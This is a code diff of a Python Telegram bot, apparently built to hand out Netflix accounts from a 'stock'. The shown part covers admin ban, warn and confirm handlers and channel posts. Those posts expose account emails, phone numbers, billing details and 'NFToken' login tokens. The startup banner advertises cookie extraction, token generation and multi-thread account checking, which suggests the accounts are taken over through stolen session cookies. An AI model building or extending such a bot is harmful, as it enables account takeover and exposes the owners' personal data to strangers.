-            user_id = int(parts[4])
-            admin_id = query.from_user.id
-            
-            if not is_admin(admin_id):
-                await query.answer("⛔ Not authorized!", show_alert=True)
-                return
-            
-            warnings = self.user_repo.add_warning(user_id, admin_id, "False report (Not Working)")
-            self.account_repo.delete(account_id)
-            self.report_repo.update_status(report_id, "accepted", admin_id)
-            
-            current_caption = query.message.caption or query.message.text or ""
-            if warnings >= 3:
-                await query.edit_message_caption(
-                    caption=current_caption + f"\n\n⚠️ <b>USER WARNED ({warnings}/3) - NOW BANNED!</b>",
-                    parse_mode=ParseMode.HTML
-                )
-                await query.answer(f"⚠️ User warned and banned ({warnings}/3)!")
-            else:
-                await query.edit_message_caption(
-                    caption=current_caption + f"\n\n⚠️ <b>USER WARNED ({warnings}/3) - ACCOUNT REMOVED!</b>",
-                    parse_mode=ParseMode.HTML
-                )
-                await query.answer(f"⚠️ User warned ({warnings}/3)!")
-            
-            try:
-                if warnings >= 3:
-                    await context.bot.send_message(
-                        user_id,
-                        f"🚫 <b>You have been BANNED from this bot!</b>\n\n"
-                        f"Reason: 3 warnings for false reports\n"
-                        f"Report ID: #{report_id}\n\n"
-                        f"👨‍💻 <b>Developer:</b> @Senzo268",
-                        parse_mode=ParseMode.HTML
-                    )
-                else:
-                    await context.bot.send_message(
-                        user_id,
-                        f"⚠️ <b>Warning #{warnings}/3</b>\n\n"
-                        f"Reason: False report (Not Working)\n"
-                        f"Report ID: #{report_id}\n"
-                        f"⚠️ {3 - warnings} warning(s) remaining before ban.\n\n"
-                        f"👨‍💻 <b>Developer:</b> @Senzo268",
-                        parse_mode=ParseMode.HTML
-                    )
-            except Exception:
-                pass
-        except Exception as e:
-            logger.error(f"warn_user_callback error: {e}")
-    
-    async def dismiss_report_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle dismiss report callback from channel."""
-        try:
-            query = update.callback_query
-            await query.answer()
-            data = query.data
-            parts = data.split("_")
-            if len(parts) < 4:
-                return
-            
-            report_id = int(parts[2])
-            account_id = int(parts[3])
-            admin_id = query.from_user.id
-            
-            if not is_admin(admin_id):
-                await query.answer("⛔ Not authorized!", show_alert=True)
-                return
-            
-            self.account_repo.delete(account_id)
-            self.report_repo.update_status(report_id, "rejected", admin_id)
-            
-            current_caption = query.message.caption or query.message.text or ""
-            await query.edit_message_caption(
-                caption=current_caption + "\n\n✅ <b>DISMISSED - Account Removed from Stock!</b>",
-                parse_mode=ParseMode.HTML
-            )
-            await query.answer("✅ Account removed from stock!")
-            
-            report = self.report_repo.get_by_id(report_id)
-            if report:
-                try:
-                    await context.bot.send_message(
-                        report.user_id,
-                        f"✅ <b>Your report #{report_id} has been ACCEPTED!</b>\n\n"
-                        f"🔄 Account has been removed from stock.\n\n"
-                        f"👨‍💻 <b>Developer:</b> @Senzo268",
-                        parse_mode=ParseMode.HTML
-                    )
-                except Exception:
-                    pass
-        except Exception as e:
-            logger.error(f"dismiss_report_callback error: {e}")
-    
-    # ============================================================
-    # CHANNEL SEND FUNCTIONS
+    # CHANNEL FUNCTIONS
     # ============================================================
     
     async def _send_working_to_channel(self, bot, report_id: int, user_id: int, account_id: int, screenshot_file_id: str):
-        """Send working account to channel."""
         if not REPORT_CHANNEL_ID:
             return None
-        
         try:
             user = self.user_repo.get(user_id)
             account = self.account_repo.get_assigned(user_id)
-            
             if not account:
                 cur = self.db.execute_sqlite('SELECT * FROM accounts WHERE id = ?', (account_id,))
                 row = cur.fetchone()
                 if row:
                     account = Account(
                         id=row[0], email=safe_str(row[1]), country=safe_str(row[2]),
-                        plan=safe_str(row[3]), account_name=safe_str(row[15]),
-                        streams=safe_int(row[16]), quality=safe_str(row[17]),
-                        price=safe_str(row[18]), billing_date=safe_str(row[19]),
-                        extra_member=safe_bool(row[24]), profiles=safe_str(row[28]),
-                        user_guid=safe_str(row[29]), nftoken=safe_str(row[5]),
-                        nftoken_expiry=safe_str(row[6]), phone=safe_str(row[23]),
-                        membership_status=safe_str(row[25])
+                        plan=safe_str(row[3]), plan_key=safe_str(row[4]),
+                        account_name=safe_str(row[15]), streams=safe_int(row[16]),
+                        quality=safe_str(row[17]), price=safe_str(row[18]),
+                        billing_date=safe_str(row[19]), extra_member=safe_bool(row[24]),
+                        profiles=safe_str(row[28]), user_guid=safe_str(row[29]),
+                        nftoken=safe_str(row[5]), nftoken_expiry=safe_str(row[6]),
+                        phone=safe_str(row[23]), membership_status=safe_str(row[25]),
+                        on_hold=safe_bool(row[31])
                     )
-            
             if not account:
                 return None
-            
             token = safe_str(account.nftoken)
             nft_expiry = safe_str(account.nftoken_expiry)
-            
             text = f"""📱 <b>WORKING ACCOUNT FOUND!</b>
 
 ━━━━━━━━━━━━━━━━━━━━━
@@ -2960,7 +2659,6 @@ Username: @{html_escape(user.username)}
 """
             if token and len(token) > 10:
                 text += f"⏳ <b>NFToken expires:</b> <code>{html_escape(nft_expiry)}</code>\n"
-            
             text += f"""
 ━━━━━━━━━━━━━━━━━━━━━
 ✅ <b>Reported by:</b> @{html_escape(user.username)}
@@ -2970,7 +2668,6 @@ Username: @{html_escape(user.username)}
 
 ⚠️ <b>This account is working!</b>
 """
-            
             keyboard = []
             if token and len(token) > 10:
                 keyboard.append([
@@ -2988,11 +2685,9 @@ Username: @{html_escape(user.username)}
                 keyboard.append([
                     InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
                 ])
-            
             keyboard.append([
                 InlineKeyboardButton("✅ Confirm Working", callback_data=f"confirm_working_{report_id}_{account_id}")
             ])
-            
             try:
                 sent_message = await bot.send_photo(
                     chat_id=REPORT_CHANNEL_ID,
@@ -3024,35 +2719,30 @@ Username: @{html_escape(user.username)}
             return None
     
     async def _send_notworking_to_channel(self, bot, report_id: int, user_id: int, account_id: int, screenshot_file_id: str):
-        """Send not working account to channel."""
         if not REPORT_CHANNEL_ID:
             return None
-        
         try:
             user = self.user_repo.get(user_id)
             account = self.account_repo.get_assigned(user_id)
-            
             if not account:
                 cur = self.db.execute_sqlite('SELECT * FROM accounts WHERE id = ?', (account_id,))
                 row = cur.fetchone()
                 if row:
                     account = Account(
                         id=row[0], email=safe_str(row[1]), country=safe_str(row[2]),
-                        plan=safe_str(row[3]), account_name=safe_str(row[15]),
-                        streams=safe_int(row[16]), quality=safe_str(row[17]),
-                        price=safe_str(row[18]), billing_date=safe_str(row[19]),
-                        extra_member=safe_bool(row[24]), profiles=safe_str(row[28]),
-                        user_guid=safe_str(row[29]), nftoken=safe_str(row[5]),
-                        nftoken_expiry=safe_str(row[6]), phone=safe_str(row[23]),
-                        membership_status=safe_str(row[25])
+                        plan=safe_str(row[3]), plan_key=safe_str(row[4]),
+                        account_name=safe_str(row[15]), streams=safe_int(row[16]),
+                        quality=safe_str(row[17]), price=safe_str(row[18]),
+                        billing_date=safe_str(row[19]), extra_member=safe_bool(row[24]),
+                        profiles=safe_str(row[28]), user_guid=safe_str(row[29]),
+                        nftoken=safe_str(row[5]), nftoken_expiry=safe_str(row[6]),
+                        phone=safe_str(row[23]), membership_status=safe_str(row[25]),
+                        on_hold=safe_bool(row[31])
                     )
-            
             if not account:
                 return None
-            
             token = safe_str(account.nftoken)
             nft_expiry = safe_str(account.nftoken_expiry)
-            
             text = f"""❌ <b>NOT WORKING ACCOUNT REPORTED!</b>
 
 ━━━━━━━━━━━━━━━━━━━━━
@@ -3067,7 +2757,6 @@ Username: @{html_escape(user.username)}
 """
             if token and len(token) > 10:
                 text += f"\n⏳ <b>NFToken expires:</b> <code>{html_escape(nft_expiry)}</code>\n"
-            
             text += f"""
 ━━━━━━━━━━━━━━━━━━━━━
 ⚠️ <b>Reported by:</b> @{html_escape(user.username)}
@@ -3078,7 +2767,6 @@ Username: @{html_escape(user.username)}
 ⛔ <b>This account is reported as NOT working!</b>
 ⚠️ <b>Dismiss = Account will be REMOVED from stock</b>
 """
-            
             keyboard = []
             if token and len(token) > 10:
                 keyboard.append([
@@ -3096,13 +2784,11 @@ Username: @{html_escape(user.username)}
                 keyboard.append([
                     InlineKeyboardButton("📺 TV Login", url="https://netflix.com/tv8")
                 ])
-            
             keyboard.append([
                 InlineKeyboardButton("✅ Yes, Ban User", callback_data=f"ban_user_{report_id}_{account_id}_{user_id}"),
                 InlineKeyboardButton("⚠️ Warn User", callback_data=f"warn_user_{report_id}_{account_id}_{user_id}"),
                 InlineKeyboardButton("❌ Dismiss", callback_data=f"dismiss_report_{report_id}_{account_id}")
             ])
-            
             try:
                 sent_message = await bot.send_photo(
                     chat_id=REPORT_CHANNEL_ID,
@@ -3134,16 +2820,187 @@ Username: @{html_escape(user.username)}
             return None
     
     # ============================================================
+    # CHANNEL CALLBACK HANDLERS
+    # ============================================================
+    
+    async def confirm_working_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        try:
+            query = update.callback_query
+            await query.answer()
+            data = query.data
+            parts = data.split("_")
+            if len(parts) < 4:
+                return
+            report_id = int(parts[2])
+            account_id = int(parts[3])
+            admin_id = query.from_user.id
+            if not is_admin(admin_id):
+                await query.answer("⛔ Not authorized!", show_alert=True)
+                return
+            self.db.execute_sqlite('UPDATE accounts SET is_working = 1, status = "available", working_confirmed = 1 WHERE id = ?', (account_id,))
+            self.db.commit_sqlite()
+            self.report_repo.update_status(report_id, "accepted", admin_id)
+            current_caption = query.message.caption or query.message.text or ""
+            await query.edit_message_caption(
+                caption=current_caption + "\n\n✅ <b>CONFIRMED WORKING by Admin!</b>",
+                parse_mode=ParseMode.HTML
+            )
+            await query.answer("✅ Account confirmed working!")
+            report = self.report_repo.get_by_id(report_id)
+            if report:
+                try:
+                    await context.bot.send_message(
+                        report["user_id"],
+                        f"✅ <b>Your report #{report_id} has been CONFIRMED!</b>\n\n"
+                        f"🎉 Account is working. Thank you for your feedback!\n\n"
+                        f"👨‍💻 <b>Developer:</b> @Senzo268",
+                        parse_mode=ParseMode.HTML
+                    )
+                except Exception:
+                    pass
+        except Exception as e:
+            logger.error(f"confirm_working_callback error: {e}")
+    
+    async def ban_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        try:
+            query = update.callback_query
+            await query.answer()
+            data = query.data
+            parts = data.split("_")
+            if len(parts) < 5:
+                return
+            report_id = int(parts[2])
+            account_id = int(parts[3])
+            user_id = int(parts[4])
+            admin_id = query.from_user.id
+            if not is_admin(admin_id):
+                await query.answer("⛔ Not authorized!", show_alert=True)
+                return
+            self.user_repo.ban(user_id, admin_id, "False report (Not Working)")
+            self.account_repo.delete(account_id)
+            self.report_repo.update_status(report_id, "accepted", admin_id)
+            current_caption = query.message.caption or query.message.text or ""
+            await query.edit_message_caption(
+                caption=current_caption + "\n\n✅ <b>USER BANNED & ACCOUNT REMOVED!</b>",
+                parse_mode=ParseMode.HTML
+            )
+            await query.answer("✅ User banned and account removed!")
+            try:
+                await context.bot.send_message(
+                    user_id,
+                    f"🚫 <b>You have been BANNED from this bot!</b>\n\n"
+                    f"Reason: False report (Not Working)\n"
+                    f"Report ID: #{report_id}\n\n"
+                    f"👨‍💻 <b>Developer:</b> @Senzo268",
+                    parse_mode=ParseMode.HTML
+                )
+            except Exception:
+                pass
+        except Exception as e:
+            logger.error(f"ban_user_callback error: {e}")
+    
+    async def warn_user_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        try:
+            query = update.callback_query
+            await query.answer()
+            data = query.data
+            parts = data.split("_")
+            if len(parts) < 5:
+                return
+            report_id = int(parts[2])
+            account_id = int(parts[3])
+            user_id = int(parts[4])
+            admin_id = query.from_user.id
+            if not is_admin(admin_id):
+                await query.answer("⛔ Not authorized!", show_alert=True)
+                return
+            warnings = self.user_repo.add_warning(user_id, admin_id, "False report (Not Working)")
+            self.account_repo.delete(account_id)
+            self.report_repo.update_status(report_id, "accepted", admin_id)
+            current_caption = query.message.caption or query.message.text or ""
+            if warnings >= 3:
+                await query.edit_message_caption(
+                    caption=current_caption + f"\n\n⚠️ <b>USER WARNED ({warnings}/3) - NOW BANNED!</b>",
+                    parse_mode=ParseMode.HTML
+                )
+                await query.answer(f"⚠️ User warned and banned ({warnings}/3)!")
+            else:
+                await query.edit_message_caption(
+                    caption=current_caption + f"\n\n⚠️ <b>USER WARNED ({warnings}/3) - ACCOUNT REMOVED!</b>",
+                    parse_mode=ParseMode.HTML
+                )
+                await query.answer(f"⚠️ User warned ({warnings}/3)!")
+            try:
+                if warnings >= 3:
+                    await context.bot.send_message(
+                        user_id,
+                        f"🚫 <b>You have been BANNED from this bot!</b>\n\n"
+                        f"Reason: 3 warnings for false reports\n"
+                        f"Report ID: #{report_id}\n\n"
+                        f"👨‍💻 <b>Developer:</b> @Senzo268",
+                        parse_mode=ParseMode.HTML
+                    )
+                else:
+                    await context.bot.send_message(
+                        user_id,
+                        f"⚠️ <b>Warning #{warnings}/3</b>\n\n"
+                        f"Reason: False report (Not Working)\n"
+                        f"Report ID: #{report_id}\n"
+                        f"⚠️ {3 - warnings} warning(s) remaining before ban.\n\n"
+                        f"👨‍💻 <b>Developer:</b> @Senzo268",
+                        parse_mode=ParseMode.HTML
+                    )
+            except Exception:
+                pass
+        except Exception as e:
+            logger.error(f"warn_user_callback error: {e}")
+    
+    async def dismiss_report_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        try:
+            query = update.callback_query
+            await query.answer()
+            data = query.data
+            parts = data.split("_")
+            if len(parts) < 4:
+                return
+            report_id = int(parts[2])
+            account_id = int(parts[3])
+            admin_id = query.from_user.id
+            if not is_admin(admin_id):
+                await query.answer("⛔ Not authorized!", show_alert=True)
+                return
+            self.account_repo.delete(account_id)
+            self.report_repo.update_status(report_id, "rejected", admin_id)
+            current_caption = query.message.caption or query.message.text or ""
+            await query.edit_message_caption(
+                caption=current_caption + "\n\n✅ <b>DISMISSED - Account Removed from Stock!</b>",
+                parse_mode=ParseMode.HTML
+            )
+            await query.answer("✅ Account removed from stock!")
+            report = self.report_repo.get_by_id(report_id)
+            if report:
+                try:
+                    await context.bot.send_message(
+                        report["user_id"],
+                        f"✅ <b>Your report #{report_id} has been ACCEPTED!</b>\n\n"
+                        f"🔄 Account has been removed from stock.\n\n"
+                        f"👨‍💻 <b>Developer:</b> @Senzo268",
+                        parse_mode=ParseMode.HTML
+                    )
+                except Exception:
+                    pass
+        except Exception as e:
+            logger.error(f"dismiss_report_callback error: {e}")
+    
+    # ============================================================
     # TEXT MESSAGE HANDLER
     # ============================================================
     
     async def handle_text_messages(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
-        """Handle text messages."""
         try:
             user_id = update.effective_user.id
             msg_text = update.message.text or ""
             
-            # Contact Admin
             if context.user_data.get("waiting_for_message"):
                 context.user_data["waiting_for_message"] = False
                 for aid in ADMIN_IDS:
@@ -3161,15 +3018,12 @@ Username: @{html_escape(user.username)}
                 await update.message.reply_text("✅ Message sent to admins!", parse_mode=ParseMode.HTML)
                 return
             
-            # Admin Broadcast Text
             if is_admin(user_id) and context.user_data.get("waiting_for_broadcast"):
                 context.user_data["waiting_for_broadcast"] = False
                 users = self.user_repo.get_all()
                 active_users = [u for u in users if not u.is_banned]
                 total_u = len(active_users)
-                
                 status_msg = await update.message.reply_text(f"🚀 Broadcasting to <b>{total_u}</b> users...", parse_mode=ParseMode.HTML)
-                
                 success, failed = 0, 0
                 for u in active_users:
                     try:
@@ -3178,7 +3032,6 @@ Username: @{html_escape(user.username)}
                     except Exception:
                         failed += 1
                     await asyncio.sleep(0.05)
-                
                 await status_msg.edit_text(
                     f"✅ <b>BROADCAST COMPLETE!</b>\n\n"
                     f"👥 Total: <b>{total_u}</b>\n"
@@ -3188,14 +3041,12 @@ Username: @{html_escape(user.username)}
                 )
                 return
             
-            # Admin User Search
             if is_admin(user_id) and context.user_data.get("waiting_for_user_search"):
                 context.user_data["waiting_for_user_search"] = False
                 user = self.user_repo.find_by_query(msg_text)
                 if not user or not user.user_id:
                     await update.message.reply_text(f"❌ User <b>{html_escape(msg_text)}</b> not found.", parse_mode=ParseMode.HTML)
                     return
-                
                 target_uid = user.user_id
                 text = f"""👤 <b>USER SEARCH RESULT</b>
 ━━━━━━━━━━━━━━━━━━━━━
@@ -3215,14 +3066,11 @@ Username: @{html_escape(user.username)}
                 else:
                     keyboard.append([InlineKeyboardButton("🚫 Ban", callback_data=f"admin_ban_{target_uid}")])
                     keyboard.append([InlineKeyboardButton("⚠️ Warn", callback_data=f"admin_warn_{target_uid}")])
-                
                 keyboard.append([InlineKeyboardButton("🔄 Reset Limits", callback_data=f"reset_user_{target_uid}")])
                 keyboard.append([InlineKeyboardButton("🔙 Back to Users", callback_data="admin_users")])
-                
                 await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode=ParseMode.HTML)
                 return
             
-            # Admin Add Channel
             if is_admin(user_id) and context.user_data.get("waiting_for_channel"):
                 context.user_data["waiting_for_channel"] = False
                 parts = [p.strip() for p in msg_text.split("|")]
@@ -3246,9 +3094,8 @@ Username: @{html_escape(user.username)}
 # MAIN APPLICATION
 # ============================================================
 def main():
-    """Main application entry point."""
     print("=" * 70)
-    print("🎬 SENZO NETFLIX BOT - PRODUCTION READY v3.0")
+    print("🎬 SENZO NETFLIX BOT - ULTIMATE EDITION v4.0")
     print("=" * 70)
     print(f"🗄️ Database: Turso (Persistent) + SQLite (Accounts)")
     print(f"👤 Admins: {ADMIN_IDS}")
@@ -3256,22 +3103,30 @@ def main():
     print(f"⏳ Cooldown: {WORKING_COOLDOWN_MINUTES} min")
     print(f"🔧 Threads: {MAX_CHECK_THREADS}")
     print("=" * 70)
+    print("📋 FEATURES:")
+    print("  ✅ Advanced Cookie Extraction (JSON/Netscape/Regex)")
+    print("  ✅ GraphQL Account Parsing")
+    print("  ✅ NFToken Generation")
+    print("  ✅ Duplicate Detection")
+    print("  ✅ Multi-thread Checking")
+    print("  ✅ User Management")
+    print("  ✅ Report System (Working/Not Working)")
+    print("  ✅ Channel Posts with Admin Actions")
+    print("  ✅ Broadcast System")
+    print("  ✅ Admin Panel (Full Control)")
+    print("=" * 70)
     
     if not BOT_TOKEN:
         print("❌ BOT_TOKEN not set!")
         return
     
-    # Start health server
     try:
         health_thread = threading.Thread(target=start_health_server, daemon=True)
         health_thread.start()
     except Exception as e:
         logger.error(f"Health server error: {e}")
     
-    # Initialize handlers
     handlers = BotHandlers()
-    
-    # Build application
     application = Application.builder().token(BOT_TOKEN).build()
     
     # Command handlers
